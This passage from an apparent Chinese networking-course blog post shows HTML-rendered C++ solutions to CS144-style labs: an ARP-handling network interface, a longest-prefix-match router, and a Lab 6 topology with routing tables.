class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// ethernet_address: Ethernet (what ARP calls &quot;hardware&quot;) address of the interface</span><br><span class="hljs-comment">// ip_address: IP (what ARP calls &quot;protocol&quot;) address of the interface</span><br><span class="hljs-comment">// cppcheck-suppress uninitMemberVar</span><br>NetworkInterface::<span class="hljs-built_in">NetworkInterface</span>(<span class="hljs-type">const</span> EthernetAddress &amp;ethernet_address, <span class="hljs-type">const</span> Address &amp;ip_address)<br>    : <span class="hljs-built_in">ethernet_address_</span>(ethernet_address), <span class="hljs-built_in">ip_address_</span>(ip_address)<br>&#123;<br>    cerr &lt;&lt; <span class="hljs-string">&quot;DEBUG: Network interface has Ethernet address &quot;</span> &lt;&lt; <span class="hljs-built_in">to_string</span>(ethernet_address_) &lt;&lt; <span class="hljs-string">&quot; and IP address &quot;</span><br>         &lt;&lt; ip_address.<span class="hljs-built_in">ip</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// dgram: the IPv4 datagram to be sent</span><br><span class="hljs-comment">// next_hop: the IP address of the interface to send it to (typically a router or default gateway, but</span><br><span class="hljs-comment">// may also be another host if directly connected to the same network as the destination)</span><br><br><span class="hljs-comment">// Note: the Address type can be converted to a uint32_t (raw 32-bit IP address) by using the</span><br><span class="hljs-comment">// Address::ipv4_numeric() method.</span><br><span class="hljs-comment">// 将待发送的 Internet(IP) datagrams 转义为以太网帧并最终发送出去</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">NetworkInterface::send_datagram</span><span class="hljs-params">(<span class="hljs-type">const</span> InternetDatagram &amp;dgram <span class="hljs-comment">/* IP数据报 */</span>, <span class="hljs-type">const</span> Address &amp;next_hop <span class="hljs-comment">/*   下一跳ip地址 */</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// 获取下一跳的ipv4地址</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> addr_numeric = next_hop.<span class="hljs-built_in">ipv4_numeric</span>();<br><br>    <span class="hljs-comment">/* ARP Table has stored the mapping info, we send the datagram directly */</span><br>  <span class="hljs-comment">// 如果缓存表arp_table里有，则直接包裹该IP数据报，然后发送</span><br>    <span class="hljs-keyword">if</span> (arp_table_.<span class="hljs-built_in">contains</span>(addr_numeric)) &#123;<br>        EthernetFrame eth_frame;<br>      <span class="hljs-comment">// source mac addr</span><br>        eth_frame.header.src = ethernet_address_;<br>      <span class="hljs-comment">// source mac addr</span><br>        eth_frame.header.dst = arp_table_.<span class="hljs-built_in">at</span>(addr_numeric).eth_addr;<br>      <span class="hljs-comment">// IPv4类型</span><br>        eth_frame.header.type = EthernetHeader::TYPE_IPv4;<br>      <span class="hljs-comment">// 序列化</span><br>        eth_frame.payload = <span class="hljs-built_in">serialize</span>(dgram);<br>      <span class="hljs-comment">// 往待发送缓冲区发送</span><br>        outbound_frames_.<span class="hljs-built_in">push</span>(eth_frame);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* ARP Table has no such mapping and we haven&#x27;t send an ARP request for target ip */</span><br>      <span class="hljs-comment">// 否则发送广播需求下一跳mac addr</span><br>        <span class="hljs-keyword">if</span> (arp_requests_lifetime_.<span class="hljs-built_in">find</span>(addr_numeric) == arp_requests_lifetime_.<span class="hljs-built_in">end</span>()) &#123;<br>            <span class="hljs-comment">// next hop ipv4 addr is not contained in the arp requests waiting list</span><br>            ARPMessage arp_msg;<br>            arp_msg.opcode = ARPMessage::OPCODE_REQUEST;<br>            arp_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_msg.sender_ethernet_address = ethernet_address_;<br>            arp_msg.target_ip_address = addr_numeric;<br>            arp_msg.target_ethernet_address = &#123;<span class="hljs-comment">/* empty */</span>&#125;;<br><br>            EthernetFrame arp_eth_frame;<br>            arp_eth_frame.header.src = ethernet_address_;<br>            arp_eth_frame.header.dst = ETHERNET_BROADCAST; <span class="hljs-comment">// 广播帧</span><br>            arp_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_eth_frame);<br><span class="hljs-comment">// 上面几步就是构建好发送的请求，往待发送缓冲区发送，同时在队列里记录该请求的存活时间</span><br>            arp_requests_lifetime_.<span class="hljs-built_in">emplace</span>(std::<span class="hljs-built_in">make_pair</span>(addr_numeric, ARP_REQUEST_DEFAULT_TTL));<br>        &#125;<br>        <span class="hljs-comment">// We need to store the datagram in the list. After we know the eth addr, we can queue</span><br>        <span class="hljs-comment">// the corresponding dgrams.</span><br>        arp_datagrams_waiting_list_.<span class="hljs-built_in">emplace_back</span>(std::pair &#123;next_hop, dgram&#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// frame: the incoming Ethernet frame</span><br><span class="hljs-comment">// 收到了以太网frame，做出响应</span><br><span class="hljs-function">optional&lt;InternetDatagram&gt; <span class="hljs-title">NetworkInterface::recv_frame</span><span class="hljs-params">(<span class="hljs-type">const</span> EthernetFrame &amp;frame)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// 如果不是广播帧且请求的目的主机可能可能和本机不同，所以本机不用作出回应</span><br>    <span class="hljs-keyword">if</span> (frame.header.dst != ethernet_address_ &amp;&amp; frame.header.dst != ETHERNET_BROADCAST) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* IP datagrams：parse error */</span><br>    <span class="hljs-keyword">if</span> (frame.header.type == EthernetHeader::TYPE_IPv4) &#123;<br>        InternetDatagram datagram;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-built_in">parse</span>(datagram, frame.payload)) &#123;<br>            <span class="hljs-comment">// printf(&quot;[NetworkInterface ERROR]: &#x27;recv_frame&#x27; IPV4 parse error\n&quot;);</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> datagram;<br>    &#125;<br><br>    <span class="hljs-comment">/* ARP datagrams */</span><br>    <span class="hljs-keyword">if</span> (frame.header.type == EthernetHeader::TYPE_ARP) &#123;<br>        ARPMessage arp_msg;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-built_in">parse</span>(arp_msg, frame.payload)) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[NetworkInterface ERROR]: &#x27;recv_frame&#x27; ARP parse error\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>        &#125;<br><br>        <span class="hljs-type">const</span> <span class="hljs-type">bool</span> is_arp_request = arp_msg.opcode == ARPMessage::OPCODE_REQUEST<br>                                    &amp;&amp; arp_msg.target_ip_address == ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>        <span class="hljs-keyword">if</span> (is_arp_request) &#123;<br>            ARPMessage arp_reply_msg;<br>            arp_reply_msg.opcode = ARPMessage::OPCODE_REPLY;<br>            arp_reply_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_reply_msg.sender_ethernet_address = ethernet_address_;<br>            arp_reply_msg.target_ip_address = arp_msg.sender_ip_address;<br>            arp_reply_msg.target_ethernet_address = arp_msg.sender_ethernet_address;<br><br>            EthernetFrame arp_reply_eth_frame;<br>            arp_reply_eth_frame.header.src = ethernet_address_;<br>            arp_reply_eth_frame.header.dst = arp_msg.sender_ethernet_address;<br>            arp_reply_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_reply_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_reply_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_reply_eth_frame);<br>        &#125;<br><br>        <span class="hljs-type">const</span> <span class="hljs-type">bool</span> is_arp_response<br>            = arp_msg.opcode == ARPMessage::OPCODE_REPLY &amp;&amp; arp_msg.target_ethernet_address == ethernet_address_;<br><br>        <span class="hljs-comment">// we can get arp info from either ARP request or ARP reply</span><br>        <span class="hljs-keyword">if</span> (is_arp_request || is_arp_response) &#123;<br>            arp_table_.<span class="hljs-built_in">emplace</span>(std::<span class="hljs-built_in">make_pair</span>(arp_msg.sender_ip_address,<br>                                              <span class="hljs-type">arp_t</span> &#123;arp_msg.sender_ethernet_address, ARP_DEFAULT_TTL&#125;));<br>            <span class="hljs-comment">// delete arp datagrams waiting list</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = arp_datagrams_waiting_list_.<span class="hljs-built_in">begin</span>(); iter != arp_datagrams_waiting_list_.<span class="hljs-built_in">end</span>();) &#123;<br>                <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[ipv4_addr, datagram] = *iter;<br>                <span class="hljs-keyword">if</span> (ipv4_addr.<span class="hljs-built_in">ipv4_numeric</span>() == arp_msg.sender_ip_address) &#123;<br>                    <span class="hljs-built_in">send_datagram</span>(datagram, ipv4_addr);<br>                    iter = arp_datagrams_waiting_list_.<span class="hljs-built_in">erase</span>(iter);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    iter++;<br>                &#125;<br>            &#125;<br>            arp_requests_lifetime_.<span class="hljs-built_in">erase</span>(arp_msg.sender_ip_address);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br><br><span class="hljs-comment">// ms_since_last_tick: the number of milliseconds since the last call to this method</span><br><span class="hljs-comment">// 记录时间， 以使得任何已经过期的 IP 地址到 Ethernet 地址的映射失效</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">NetworkInterface::tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* delete expired ARP items in ARP Table */</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> Don&#x27;t use &#x27;iter++&#x27; if we have erase current iter&#x27;s data!</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = arp_table_.<span class="hljs-built_in">begin</span>(); iter != arp_table_.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">/* nop */</span>) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[ipv4_addr_numeric, arp] = *iter;<br>        <span class="hljs-keyword">if</span> (arp.ttl &lt;= ms_since_last_tick) &#123;<br>          <span class="hljs-comment">// 小于一定阈值，则抹除</span><br>            iter = arp_table_.<span class="hljs-built_in">erase</span>(iter);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 更新缓存表每一项的存活时间</span><br>            arp.ttl -= ms_since_last_tick;<br>            iter++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* delete expired ARP requests */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;[ipv4_addr, arp_ttl] : arp_requests_lifetime_) &#123;<br>        <span class="hljs-comment">/* resent ARP request if this request has expired */</span><br>        <span class="hljs-keyword">if</span> (arp_ttl &lt;= ms_since_last_tick) &#123;<br>            ARPMessage arp_msg;<br>            arp_msg.opcode = ARPMessage::OPCODE_REQUEST;<br>            arp_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_msg.sender_ethernet_address = ethernet_address_;<br>            arp_msg.target_ip_address = ipv4_addr;<br>            arp_msg.target_ethernet_address = &#123;<span class="hljs-comment">/* empty */</span>&#125;;<br><br>            EthernetFrame arp_eth_frame;<br>            arp_eth_frame.header.src = ethernet_address_;<br>            arp_eth_frame.header.dst = ETHERNET_BROADCAST;<br>            arp_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_eth_frame);<br><br>            <span class="hljs-comment">/* reset ARP ttl for this component */</span><br>            arp_ttl = ARP_REQUEST_DEFAULT_TTL;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 更新每个请求的存活时间</span><br>            arp_ttl -= ms_since_last_tick;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">optional&lt;EthernetFrame&gt; <span class="hljs-title">NetworkInterface::maybe_send</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!outbound_frames_.<span class="hljs-built_in">empty</span>()) &#123;<br>        EthernetFrame eth_frame = std::<span class="hljs-built_in">move</span>(outbound_frames_.<span class="hljs-built_in">front</span>());<br>        outbound_frames_.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> eth_frame;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Lab 5:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// route_prefix: The &quot;up-to-32-bit&quot; IPv4 address prefix to match the datagram&#x27;s destination address against</span><br><span class="hljs-comment">// prefix_length: For this route to be applicable, how many high-order (most-significant) bits of</span><br><span class="hljs-comment">//    the route_prefix will need to match the corresponding bits of the datagram&#x27;s destination address?</span><br><span class="hljs-comment">// next_hop: The IP address of the next hop. Will be empty if the network is directly attached to the router (in</span><br><span class="hljs-comment">//    which case, the next hop address should be the datagram&#x27;s final destination).</span><br><span class="hljs-comment">// interface_num: The index of the interface to send the datagram out on.</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Router::add_route</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> route_prefix, <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> prefix_length, <span class="hljs-type">const</span> optional&lt;Address&gt; next_hop, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> interface_num)</span><br>&#123;<br>    <span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;DEBUG: adding route &quot;</span> &lt;&lt; Address::from_ipv4_numeric(route_prefix).ip() &lt;&lt; <span class="hljs-string">&quot;/&quot;</span><br>         &lt;&lt; static_cast&lt;<span class="hljs-type">int</span>&gt;(prefix_length) &lt;&lt; <span class="hljs-string">&quot; =&gt; &quot;</span> &lt;&lt; (next_hop.has_value() ? next_hop-&gt;ip() : <span class="hljs-string">&quot;(direct)&quot;</span>)<br>         &lt;&lt; <span class="hljs-string">&quot; on interface &quot;</span> &lt;&lt; interface_num &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><br>    routing_table_.emplace_back(<span class="hljs-type">route_t</span> &#123;route_prefix, prefix_length, next_hop, interface_num&#125;);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Router::route</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// scan interfaces to receive InternetDatagram</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;net_interface : interfaces_) &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">std</span>::optional&lt;InternetDatagram&gt; datagram = net_interface.maybe_receive()) &#123;<br>            <span class="hljs-keyword">if</span> (datagram) &#123;<br>                InternetDatagram dgram = datagram.value();<br>                <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> dst_ipaddr_numeric = dgram.header.dst;<br>                <span class="hljs-keyword">auto</span> largest_matched_iter = routing_table_.end();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> route = routing_table_.begin(); route != routing_table_.end(); route++) &#123;<br>                    <span class="hljs-comment">// zero prefix_length means match all</span><br>                    <span class="hljs-keyword">if</span> (route-&gt;prefix_length == <span class="hljs-number">0</span><br>                        || ((route-&gt;route_prefix ^ dst_ipaddr_numeric)<br>                            &gt;&gt; (static_cast&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">32</span>) - route-&gt;prefix_length)) == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-comment">// update longest prefix matched route</span><br>                        <span class="hljs-keyword">if</span> (largest_matched_iter == routing_table_.end()<br>                            || route-&gt;prefix_length &gt; largest_matched_iter-&gt;prefix_length) &#123;<br>                            largest_matched_iter = route;<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// check the legitimacy of the incoming datagram</span><br>                <span class="hljs-type">uint8_t</span> &amp;ttl = dgram.header.ttl;<br>                <span class="hljs-keyword">if</span> (largest_matched_iter != routing_table_.end() &amp;&amp; ttl-- &gt; <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-comment">// We have changed the dgram content. Checksum needs to be recomputed.</span><br>                    dgram.header.compute_checksum();<br>                    AsyncNetworkInterface &amp;outbound_interface = interface(largest_matched_iter-&gt;interface_id);<br>                    <span class="hljs-type">const</span> Address next_addr = largest_matched_iter-&gt;next_hop.has_value()<br>                                                  ? largest_matched_iter-&gt;next_hop.value()<br>                                                  : Address::from_ipv4_numeric(dst_ipaddr_numeric);<br>                    outbound_interface.send_datagram(dgram, next_addr);<br>                &#125;; <span class="hljs-comment">// no route matched (increase code readability)</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Lab6:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">client</span><span class="hljs-params">(<span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>)</span></span> =&gt; <span class="hljs-built_in">router1</span>(<span class="hljs-number">10.0</span>.<span class="hljs-number">0.192</span>) =&gt; <span class="hljs-built_in">router2</span>(<span class="hljs-number">10.0</span>.<span class="hljs-number">0.172</span>) =&gt; <span class="hljs-built_in">server</span>(<span class="hljs-number">172.10</span>.<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230730194254878.png"alt="image-20230730194254878" /><figcaption aria-hidden="true">image-20230730194254878</figcaption></figure><p>路由表：</p><table><thead><tr class="header"><th>ip</th><th>next hop</th></tr></thead><tbody><tr class="odd"><td>192.168.0.0</td><td>不转发</td></tr><tr class="even"><td>10.0.0.0</td><td>不转发</td></tr><tr class="odd"><td>172.16.0.0</td><td>10.0.0.172</td></tr></tbody></table><table><thead><tr class="header"><th>Ip</th><th>next hop</th></tr></thead><tbody><tr class="odd"><td>172.16.0.0</td><td>不转发</td></tr><tr class="even"><td>10.0.0.0</td><td>不转发</td></tr><tr class="odd"><td>192.168.0.0</td><td>10.0.0.192</td></tr></tbody></table><p>endtoend</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span 